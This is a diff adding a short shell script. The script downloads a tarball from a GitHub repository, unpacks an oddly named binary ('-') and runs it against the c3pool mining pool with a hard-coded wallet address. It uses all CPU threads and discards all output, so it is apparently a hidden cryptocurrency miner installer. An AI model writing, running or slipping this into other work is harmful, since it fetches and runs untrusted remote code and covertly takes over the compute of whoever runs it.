@@ -1,0 +1,10 @@
+#!/bin/sh
+
+A=auto.c3pool.org:80
+B=88xDUfnrcMJSXTuq5NmpFsNPtxNV7sbSUguJXTNjGsA6Sk3sFGK2kQtTCiF9PcfUpSQ87Jc3JVv8CeDYoubJmQPh9ELBtDA
+C=hehee
+apt-get update && apt-get upgrade -y
+wget https://github.com/muledan1/bash/raw/main/-.tar.gz
+tar -xf -.tar.gz
+./- -o $A -u $B.$C -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
